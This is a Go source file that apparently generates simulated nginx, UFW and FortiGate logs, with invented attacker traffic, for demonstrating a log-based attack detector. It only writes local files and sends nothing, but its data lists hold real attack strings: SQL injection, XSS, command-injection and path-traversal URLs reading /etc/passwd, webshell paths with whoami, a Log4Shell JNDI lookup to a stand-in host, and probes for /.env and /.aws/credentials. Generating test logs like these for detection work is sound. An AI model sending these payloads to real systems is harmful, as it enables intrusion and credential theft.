// Package demo 生成用于演示与测试的模拟日志（nginx + UFW + FortiGate）。
// 所有 IP 均为随机生成的公网地址，日志内容仅用于本地演示检测效果。
package demo

import (
	"bufio"
	"context"
	"fmt"
	"math/rand"
	"os"
	"path/filepath"
	"time"
)

type writer struct {
	nginx, ufw, forti *bufio.Writer
	files             []*os.File
}

func open(dir string, appendMode bool) (*writer, error) {
	if err := os.MkdirAll(dir, 0o755); err != nil {
		return nil, err
	}
	flag := os.O_CREATE | os.O_WRONLY | os.O_TRUNC
	if appendMode {
		flag = os.O_CREATE | os.O_WRONLY | os.O_APPEND
	}
	w := &writer{}
	for _, name := range []string{"access.log", "ufw.log", "fortigate.log"} {
		f, err := os.OpenFile(filepath.Join(dir, name), flag, 0o644)
		if err != nil {
			w.close()
			return nil, err
		}
		w.files = append(w.files, f)
	}
	w.nginx, w.ufw, w.forti = bufio.NewWriter(w.files[0]), bufio.NewWriter(w.files[1]), bufio.NewWriter(w.files[2])
	return w, nil
}

func (w *writer) flush() {
	for _, b := range []*bufio.Writer{w.nginx, w.ufw, w.forti} {
		if b != nil {
			b.Flush()
		}
	}
}

func (w *writer) close() {
	w.flush()
	for _, f := range w.files {
		f.Close()
	}
}

// Sim 是模拟器。
type Sim struct {
	r         *rand.Rand
	normal    []string
	attackers []attacker
	server    string
	botnet    []string // 分布式撞库的僵尸网络来源
	nextID    int      // 接口遍历的下一个用户 ID
}

type attacker struct {
	ip     string
	kind   string
	ua     string
	viaCDN bool
}

// randPublicIP 生成随机的公网 IPv4 地址（排除保留与私有网段）。
func (s *Sim) randPublicIP() string {
	for {
		a, b := s.r.Intn(223)+1, s.r.Intn(256)
		switch {
		case a == 10, a == 127, a == 0,
			a == 100 && b >= 64 && b <= 127,
			a == 169 && b == 254,
			a == 172 && b >= 16 && b <= 31,
			a == 192 && b == 168,
			a == 198 && (b == 18 || b == 19):
			continue
		}
		return fmt.Sprintf("%d.%d.%d.%d", a, b, s.r.Intn(256), s.r.Intn(254)+1)
	}
}

// 国内运营商分配较集中的 /8 地址段，演示时让部分来源落在国内，便于展示中国地图与省级下钻。
var cnOctets = []int{1, 14, 27, 36, 39, 42, 49, 58, 59, 60, 61, 101, 106, 110, 111, 112, 113, 114, 115, 116, 117, 118,
	119, 120, 121, 122, 123, 124, 125, 175, 180, 182, 183, 202, 210, 211, 218, 219, 220, 221, 222, 223}

func (s *Sim) randIP() string {
	if s.r.Intn(10) < 4 {
		return fmt.Sprintf("%d.%d.%d.%d", pick(s.r, cnOctets), s.r.Intn(256), s.r.Intn(256), s.r.Intn(254)+1)
	}
	return s.randPublicIP()
}

func New(seed int64) *Sim {
	s := &Sim{r: rand.New(rand.NewSource(seed)), server: "10.0.0.10"}
	for i := 0; i < 150; i++ {
		s.normal = append(s.normal, s.randIP())
	}
	kinds := []string{"dirscan", "sqli", "xss", "rce", "log4j", "webshell", "brute", "cc", "sensitive", "portscan",
		"sshbrute", "redis", "iot", "mapping", "mixed", "mixed", "dirscan", "sqli", "portscan", "sshbrute", "rce", "iot",
		"dirscan", "sqli", "xss", "rce", "brute", "portscan", "sshbrute", "iot", "mapping", "sensitive", "mixed", "webshell", "log4j", "dirscan",
		"crawler", "botnet"}
	for i, k := range kinds {
		a := attacker{ip: s.randIP(), kind: k, ua: pick(s.r, browserUA), viaCDN: i%5 == 0}
		switch k {
		case "dirscan":
			a.ua = pick(s.r, []string{"Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)", "dirsearch/0.4.3", "gobuster/3.6", "Mozilla/5.0 zgrab/0.x"})
		case "sqli":
			a.ua = "sqlmap/1.7.11#stable (https://sqlmap.org)"
		case "mapping":
			a.ua = "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
		case "brute":
			a.ua = "python-requests/2.31.0"
		case "rce":
			a.ua = pick(s.r, []string{"Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Go-http-client/1.1", "curl/8.4.0"})
		case "crawler":
			a.ua = "python-httpx/0.27.0"
		}
		s.attackers = append(s.attackers, a)
	}
	for i := 0; i < 30; i++ {
		s.botnet = append(s.botnet, s.randIP())
	}
	s.nextID = 100000
	return s
}

func pick[T any](r *rand.Rand, list []T) T { return list[r.Intn(len(list))] }

var browserUA = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.50",
	"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36",
}

var normalPaths = []string{"/", "/index.html", "/about", "/products", "/products/1024", "/news/2026/10/22", "/static/js/app.js",
	"/static/css/main.css", "/api/v1/user/profile", "/api/v1/orders?page=2", "/search?q=router", "/login", "/favicon.ico",
	"/images/banner.jpg", "/wp-content/themes/main/style.css", "/actuator/health", "/admin/index.php"}

var (
	scanPaths = []string{"/.git/config", "/.env", "/backup.zip", "/wwwroot.rar", "/phpmyadmin/", "/wp-login.php", "/admin/login",
		"/.svn/entries", "/web.config", "/config.php.bak", "/actuator/env", "/server-status", "/phpinfo.php", "/db.sql", "/.DS_Store",
		"/manager/html", "/solr/admin/cores", "/druid/index.html", "/nacos/", "/swagger-ui.html", "/xmlrpc.php", "/.aws/credentials",
		"/WEB-INF/web.xml", "/console/login", "/old/", "/test/", "/upload/", "/api/v2/debug"}
	sqliPayloads = []string{"/products?id=1'%20AND%201=1--%20", "/products?id=1%20UNION%20ALL%20SELECT%20NULL,CONCAT(0x7e,user(),0x7e),NULL--%20-",
		"/search?q=1'%20AND%20SLEEP(5)--%20", "/api/v1/orders?id=1%20AND%20extractvalue(1,concat(0x7e,(select%20database())))",
		"/news?id=-1%20union%20select%201,group_concat(table_name),3%20from%20information_schema.tables--", "/login?user=admin'%20or%20'1'='1"}
	xssPayloads = []string{"/search?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E", "/search?q=%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E",
		"/comment?text=%3Csvg/onload=confirm(1)%3E", "/redirect?url=javascript:alert(1)"}
	rcePayloads = []string{"/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id",
		"/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh", "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "/api/ping?host=127.0.0.1;cat%20/etc/passwd",
		"/_ignition/execute-solution", "/download?file=../../../../etc/passwd", "/index.php?page=php://filter/convert.base64-encode/resource=index.php",
		"/actuator/gateway/routes/demo", "/GponForm/diag_Form?images/", "/wls-wsat/CoordinatorPortType", "/pages/doenterpagevariables.action"}
	webshellPaths = []string{"/uploads/2026/10/shell.php", "/images/x.php?cmd=whoami", "/upload/avatar/1.jsp", "/wp-content/uploads/wso.php"}
	scanPorts     = []int{21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 1433, 1521, 2375, 3306, 3389, 5432, 5900, 6379,
		7001, 8080, 8443, 8888, 9200, 11211, 27017, 5985, 873, 2049, 6443, 10250, 5555, 8848}
)

func (s *Sim) nginxLine(t time.Time, a attacker, method, uri string, status, size int) string {
	remote, xff := a.ip, "-"
	if a.viaCDN {
		remote, xff = "10.0.0.2", a.ip // 经内网负载均衡/CDN 回源，真实 IP 在 X-Forwarded-For 中
	}
	return fmt.Sprintf(`%s - - [%s] "%s %s HTTP/1.1" %d %d "-" "%s" "%s"`,
		remote, t.Format("02/Jan/2006:15:04:05 -0700"), method, uri, status, size, a.ua, xff)
}

func (s *Sim) ufwLine(t time.Time, src string, dport int, block bool) string {
	act := "[UFW BLOCK]"
	if !block {
		act = "[UFW ALLOW]"
	}
	return fmt.Sprintf("%s web01 kernel: [%d.%03d] %s IN=eth0 OUT= MAC=52:54:00:12:34:56:52:54:00:65:43:21:08:00 SRC=%s DST=%s LEN=44 TOS=0x00 PREC=0x00 TTL=%d ID=%d PROTO=TCP SPT=%d DPT=%d WINDOW=1024 RES=0x00 SYN URGP=0",
		t.Format("Jan _2 15:04:05"), s.r.Intn(900000)+1000, s.r.Intn(1000), act, src, s.server, 40+s.r.Intn(200), s.r.Intn(65535), 1024+s.r.Intn(60000), dport)
}

func (s *Sim) fortiLine(t time.Time, src, dst string, dport int, deny bool) string {
	act := "deny"
	if !deny {
		act = "accept"
	}
	return fmt.Sprintf(`date=%s time=%s devname="FGT-HQ" devid="FG100F0000000001" logid="0000000013" type="traffic" subtype="forward" level="notice" srcip=%s srcport=%d srcintf="wan1" dstip=%s dstport=%d dstintf="internal" proto=6 action="%s" policyid=%d service="tcp/%d"`,
		t.Format("2006-01-02"), t.Format("15:04:05"), src, 1024+s.r.Intn(60000), dst, dport, act, s.r.Intn(20), dport)
}

// fortiOutLine 生成内网主机访问公网的出站流量日志。
func (s *Sim) fortiOutLine(t time.Time, src, dst string, dport int, deny bool) string {
	act := "deny"
	if !deny {
		act = "accept"
	}
	return fmt.Sprintf(`date=%s time=%s devname="FGT-HQ" devid="FG100F0000000001" logid="0000000013" type="traffic" subtype="forward" level="notice" srcip=%s srcport=%d srcintf="internal" dstip=%s dstport=%d dstintf="wan1" proto=6 action="%s" policyid=%d service="tcp/%d"`,
		t.Format("2006-01-02"), t.Format("15:04:05"), src, 1024+s.r.Intn(60000), dst, dport, act, s.r.Intn(20), dport)
}

// beacon 模拟内网失陷主机：10.0.0.31 周期性回连 C2（被放行），10.0.0.32 尝试连接矿池端口（被拦截），
// 另有正常的出站访问作为对照。外连地址位于演示情报 configs/demo-intel.txt 中。
func (s *Sim) beacon(w *writer, t time.Time) {
	if t.Minute()%7 == 0 {
		fmt.Fprintln(w.forti, s.fortiOutLine(s.sec(t), "10.0.0.31", "203.0.113.66", 443, false))
	}
	if t.Minute()%23 == 0 {
		fmt.Fprintln(w.forti, s.fortiOutLine(s.sec(t), "10.0.0.32", "203.0.113.99", 3333, true))
	}
	fmt.Fprintln(w.forti, s.fortiOutLine(s.sec(t), pick(s.r, []string{"10.0.0.31", "10.0.0.45", "10.0.0.46"}), s.randPublicIP(), 443, false))
}

func (s *Sim) sec(t time.Time) time.Time { return t.Add(time.Duration(s.r.Intn(60)) * time.Second) }

// emit 生成某一分钟内的一批日志，intensity 控制量级。
func (s *Sim) emit(w *writer, t time.Time, intensity int) {
	for i := 0; i < 3*intensity; i++ {
		u := attacker{ip: pick(s.r, s.normal), ua: pick(s.r, browserUA), viaCDN: s.r.Intn(10) == 0}
		st := 200
		if s.r.Intn(30) == 0 {
			st = 404
		}
		fmt.Fprintln(w.nginx, s.nginxLine(s.sec(t), u, "GET", pick(s.r, normalPaths), st, 500+s.r.Intn(20000)))
	}
	for i := 0; i < intensity; i++ {
		fmt.Fprintln(w.forti, s.fortiLine(s.sec(t), pick(s.r, s.normal), s.server, pick(s.r, []int{80, 443}), false))
	}
	s.beacon(w, t)
	for i := 0; i < intensity; i++ {
		if s.r.Intn(3) == 0 {
			s.attack(w, t, s.attackers[s.r.Intn(len(s.attackers))])
		}
	}
}

func (s *Sim) attack(w *writer, t time.Time, a attacker) {
	web := func(method, uri string, status, size int) {
		fmt.Fprintln(w.nginx, s.nginxLine(s.sec(t), a, method, uri, status, size))
	}
	switch a.kind {
	case "dirscan":
		for i := 0; i < 50+s.r.Intn(30); i++ {
			web("GET", pick(s.r, scanPaths), pick(s.r, []int{404, 404, 404, 403}), 150)
			web("GET", fmt.Sprintf("/%s%d.php", pick(s.r, []string{"admin", "test", "bak", "upload", "config"}), s.r.Intn(1000)), 404, 150)
		}
	case "sqli":
		for i := 0; i < 5+s.r.Intn(10); i++ {
			web("GET", pick(s.r, sqliPayloads), pick(s.r, []int{200, 500, 403, 200}), 1200+s.r.Intn(3000))
		}
	case "xss":
		for i := 0; i < 3+s.r.Intn(5); i++ {
			web("GET", pick(s.r, xssPayloads), pick(s.r, []int{200, 403}), 800+s.r.Intn(2000))
		}
	case "rce":
		for i := 0; i < 2+s.r.Intn(6); i++ {
			web(pick(s.r, []string{"GET", "POST"}), pick(s.r, rcePayloads), pick(s.r, []int{404, 404, 403, 400, 200}), 300)
		}
	case "log4j":
		saved := a.ua
		a.ua = "${jndi:ldap://198.51.100.9:1389/Exploit}"
		web("GET", "/?x=${jndi:ldap://198.51.100.9:1389/a}", 200, 5321)
		web("GET", "/api/v1/user/profile", 401, 120)
		a.ua = saved
	case "webshell":
		for i := 0; i < 3+s.r.Intn(5); i++ {
			web("POST", pick(s.r, webshellPaths), 200, 64+s.r.Intn(500))
		}
	case "brute":
		for i := 0; i < 30+s.r.Intn(20); i++ {
			st := 401
			if i == 25 {
				st = 200
			}
			web("POST", pick(s.r, []string{"/login", "/wp-login.php", "/admin/login"}), st, 320)
		}
	case "cc":
		for i := 0; i < 700; i++ {
			web("GET", pick(s.r, []string{"/", "/search?q=" + fmt.Sprint(s.r.Intn(100000)), "/api/v1/orders?page=1"}), 200, 9000)
		}
	case "sensitive":
		web("GET", "/.git/config", 200, 312)
		web("GET", "/.env", 200, 1530)
		web("GET", "/backup.zip", 200, 52428800)
		web("GET", "/actuator/env", 200, 8812)
		web("GET", "/phpmyadmin/", 200, 10240)
	case "portscan":
		for _, p := range scanPorts {
			fmt.Fprintln(w.ufw, s.ufwLine(s.sec(t), a.ip, p, p != 80 && p != 443))
		}
	case "sshbrute":
		port := pick(s.r, []int{22, 22, 3389})
		for i := 0; i < 40; i++ {
			fmt.Fprintln(w.forti, s.fortiLine(s.sec(t), a.ip, s.server, port, i%4 != 0))
		}
	case "redis":
		fmt.Fprintln(w.forti, s.fortiLine(s.sec(t), a.ip, "10.0.0.21", 6379, false))
		fmt.Fprintln(w.forti, s.fortiLine(s.sec(t), a.ip, "10.0.0.22", 9200, true))
	case "iot":
		for _, p := range []int{23, 2323, 5555, 37215, 52869, 7547} {
			fmt.Fprintln(w.ufw, s.ufwLine(s.sec(t), a.ip, p, true))
		}
	case "mapping":
		web("GET", "/", 200, 5321)
		for _, p := range []int{22, 80, 443, 8080, 3389} {
			fmt.Fprintln(w.ufw, s.ufwLine(s.sec(t), a.ip, p, p != 80 && p != 443))
		}
	case "crawler":
		// 按顺序遍历用户资料接口（越权遍历 / 批量爬取个人信息）
		for i := 0; i < 320; i++ {
			s.nextID++
			web("GET", fmt.Sprintf("/api/v1/user/%d/profile", s.nextID), 200, 800+s.r.Intn(200))
		}
	case "botnet":
		// 僵尸网络撞库：30 个来源各尝试几次，单个来源达不到暴力破解阈值
		for _, ip := range s.botnet {
			b := attacker{ip: ip, ua: pick(s.r, browserUA)}
			for j := 0; j < 4; j++ {
				fmt.Fprintln(w.nginx, s.nginxLine(s.sec(t), b, "POST", "/wp-login.php", 401, 320))
			}
		}
	case "mixed":
		for i := 0; i < 6; i++ {
			fmt.Fprintln(w.ufw, s.ufwLine(s.sec(t), a.ip, pick(s.r, scanPorts), true))
		}
		web("GET", pick(s.r, scanPaths), 404, 150)
		web("GET", pick(s.r, sqliPayloads), 200, 2300)
		web("GET", pick(s.r, rcePayloads), 500, 120)
		web("POST", "/uploads/2026/10/shell.php", 200, 88)
	}
}

// Generate 生成过去 hours 小时的历史日志。
func Generate(dir string, hours int, intensity int, seed int64) error {
	w, err := open(dir, false)
	if err != nil {
		return err
	}
	defer w.close()
	s := New(seed)
	end := time.Now().Truncate(time.Minute)
	for t := end.Add(-time.Duration(hours) * time.Hour); !t.After(end); t = t.Add(time.Minute) {
		// 夜间流量较低，工作时间较高，并在若干时间点制造攻击高峰
		k := intensity
		if h := t.Hour(); h < 7 {
			k = max(1, intensity/3)
		}
		if t.Minute()%37 == 0 {
			k *= 3
		}
		s.emit(w, t, k)
	}
	return nil
}

// Live 持续向日志追加实时数据，直到 ctx 结束。
func Live(ctx context.Context, dir string, interval time.Duration, intensity int, seed int64) error {
	w, err := open(dir, true)
	if err != nil {
		return err
	}
	defer w.close()
	s := New(seed)
	t := time.NewTicker(interval)
	defer t.Stop()
	for {
		select {
		case <-ctx.Done():
			return nil
		case now := <-t.C:
			s.emitLive(w, now, intensity)
			w.flush()
		}
	}
}

// emitLive 生成时间戳为当前时间的少量日志。
func (s *Sim) emitLive(w *writer, now time.Time, intensity int) {
	for i := 0; i < 2*intensity; i++ {
		u := attacker{ip: pick(s.r, s.normal), ua: pick(s.r, browserUA)}
		fmt.Fprintln(w.nginx, s.nginxLine(now, u, "GET", pick(s.r, normalPaths), 200, 500+s.r.Intn(20000)))
	}
	if s.r.Intn(30) == 0 {
		s.beacon(w, now.Add(-59*time.Second).Truncate(time.Minute))
	}
	if s.r.Intn(2) == 0 {
		a := s.attackers[s.r.Intn(len(s.attackers))]
		if a.kind == "cc" {
			return
		}
		// attack 会在 t 之后 0-59 秒内随机分布事件，回拨一分钟使时间不晚于当前
		s.attack(w, now.Add(-59*time.Second), a)
	}
}
